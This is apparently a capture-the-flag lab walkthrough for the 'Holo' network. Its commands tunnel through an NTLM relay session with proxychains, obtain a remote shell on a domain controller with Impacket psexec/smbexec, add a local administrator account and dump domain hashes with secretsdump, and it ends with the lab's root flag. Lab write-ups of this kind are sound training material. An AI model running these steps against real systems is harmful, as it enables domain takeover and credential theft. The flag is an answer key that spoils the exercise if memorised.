We now have a working relay from S-SRV02. We can now weaponize this relay to attempt to gain further access to the domain and dump credentials on DC-SRV01 using the captured session.  

To begin working with the session, we need to configure our proxy settings to tunnel through the SOCKs session created by NTLMRelayX. Add the following line to your proxychains configuration:  

`socks4 127.0.0.1 1080`

First, we're going to be utilizing psexec, [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py.](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py.)

This is the first tool we'll use in the Remote NetNTLMRelay; this will allow us to execute one-off commands in a non-interactive shell on the target system. We can use this to add a new user account on the domain, and we can also grant them Local Administrator access on the Domain Controller. This will allow us to move into the next section, enabling us to dump all credentials on the domain. Alternatively, you could add this user to the Domain Admins group and proceed without dumping credentials.  

Syntax to gain RCE: `proxychains psexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.x.30`

Syntax to add a new user: `net user MyNewUser Password123! /add`

Syntax to add the user to the Local Admin group: `net localgroup Administrators /add MyNewUser`

> [!note]
> If you are experiencing issues with PSExec, try SMBExec.


The second tool we are looking at is secretsdump, [https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). 

This tool is also part of the Impacket suite and attempts to dump domain hashes and other authentication information from a remote attacker. From the secretsdump GitHub, *"Performs various techniques to dump hashes from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\\Temp dir) and read the rest of the data from there."*  

We can automatically authenticate to secretsdump and dump machine account credentials from the domain controller using our captured session. Find syntax for secretsdump below.  

Syntax: `secretsdump.py 'HOLOLIVE/MyNewUser:Password123!@10.200.x.30'`

We should have dumped credentials for the entire domain, and we essentially own the domain at this point. We can now move on to exfiltration and clean up our target and goal.


---
# Your job

- On the attacking machine,  add the following line to `/etc/proxychains4.conf`.

```
$ socks4 127.0.0.1 1080
```

- Run the following command.

```
$ proxychains /usr/bin/impacket-smbexec HOLOLIVE/SRV-ADMIN@10.200.X.30 -no-pass
```

![[Task 48 - Ready your weapons-20241123142537654.webp]]

> [!success]
> You have a semi-interactive shell on **DC-SRV01** as root.


---

## Flag after rooting DC-SRV01

- Run the following code to get root's flag.

```
C:\Windows\system32>type c:\Users\Administrator\Desktop\root.txt

```
    
    HOLO{29d166d973477c6d8b00ae1649ce3a44}
    
- Submit the user flag on Task 4, question 8.


**Next step:** [[Conclusion]]



